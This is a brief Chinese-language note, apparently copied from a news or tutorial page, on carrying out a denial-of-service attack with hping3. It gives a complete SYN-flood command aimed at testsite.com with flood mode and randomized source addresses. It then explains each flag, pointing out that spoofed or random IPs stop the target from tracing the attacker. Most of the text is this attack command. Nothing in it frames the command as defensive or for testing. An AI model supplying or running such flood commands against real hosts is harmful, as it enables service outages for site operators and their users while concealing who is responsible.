#使用hping3/nping施行DoS攻擊
```
# hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testsite.com
```
```
-c：發送數據包的個數
-d：每個數據包的大小
-S：發送SYN數據包
-w：TCP window大小
-p：目標埠，你可以指定任意埠
–flood：儘可能快的發送數據包
–rand-source：使用隨機的IP位址，目標機器看到一堆ip，不能定位你的實際IP；也可以使用-a或–spoof隱藏主機名
```
```
https://kknews.cc/zh-tw/news/3n9lrya.html
```
